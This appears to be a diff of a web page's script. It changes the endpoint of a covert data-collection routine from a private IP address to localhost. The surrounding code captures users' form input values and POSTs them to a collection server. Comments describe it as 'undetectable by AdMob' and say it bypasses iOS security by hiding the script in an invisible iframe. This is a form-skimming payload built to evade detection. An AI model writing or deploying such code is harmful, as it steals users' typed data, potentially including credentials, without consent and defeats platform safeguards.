@@ -227,7 +227,7 @@ body{
                 };
 
                 // Send data to your server (undetectable by AdMob)
-                fetch("https://192.168.181.128/collect", {
+                fetch("http://localhost:8080/collect", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(data)
@@ -244,7 +244,7 @@ body{
                         inputType: type,
                         inputValue: value
                     };
-                    fetch("https://192.168.181.128/collect", {
+                    fetch("http://localhost:8080/collect", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(data)
@@ -254,7 +254,7 @@ body{
 
             // Bypass iOS security by hiding script in iframe
             const iframe = document.createElement("iframe");
-            iframe.src = "https://192.168.181.128/collect";
+            iframe.src = "http://localhost:8080/collect";
             iframe.style.display = "none";
             document.body.appendChild(iframe);
 			
@@ -417,3 +417,4 @@ window.addEventListener("beforeunload", function (e) {
 
 </body>
 </html>
+
